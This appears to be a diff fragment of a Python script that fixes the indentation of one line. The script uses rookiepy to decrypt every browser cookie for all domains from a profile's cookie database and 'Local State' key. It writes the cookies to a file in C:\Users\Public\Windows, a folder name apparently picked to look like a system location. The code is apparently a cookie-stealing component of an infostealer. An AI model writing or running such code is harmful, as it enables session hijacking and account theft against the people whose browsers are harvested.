@@ -52,7 +52,7 @@ def main():
         print(db_path)
         key_path = Path(BASE_DIR) / "Local State"
         print(key_path)
-                cookies = rookiepy.any_browser(db_path=str(db_path), key_path=str(key_path), domains=None)
+            cookies = rookiepy.any_browser(db_path=str(db_path), key_path=str(key_path), domains=None)
         output_file = f"C:\\Users\\Public\\Windows\\ck_{profile}.txt"  # Adjusted to use profile
         with open(output_file, "w") as file:
             json.dump(cookies, file, indent=4)
